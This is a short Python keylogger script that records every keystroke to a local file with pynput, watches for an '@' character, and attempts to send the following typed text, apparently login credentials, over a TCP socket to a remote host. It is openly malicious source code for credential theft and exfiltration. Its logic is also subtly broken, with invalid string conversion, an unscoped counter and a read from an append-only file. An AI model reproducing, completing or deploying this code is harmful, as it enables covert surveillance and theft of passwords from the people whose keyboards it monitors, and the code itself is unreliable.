import socket
from pynput.keyboard import Key, Listener

target_host = ""
target_port = 99
client = socket.socket(socket.AF_INET,socket.SOCK_STREAM)

def send_data(st):
    client.connect((target_host,target_port))
    client.send(str.encode(st))
    client.close()

wait_for_pass = -1
def on_press(key):
    with open('key_log.txt','a') as f:
        f.write(str(key, 'utf-8'))
        if key=='@':
            wait_for_pass += 1
        if wait_for_pass>0 and wait_for_pass<100:
             wait_for_pass+=1
        if wait_for_pass>100:
            f.seek(-200, 1)
            wait_for_pass = -1
            send_data(f.read())

with Listener(on_press=on_press) as listener:
    listener.join()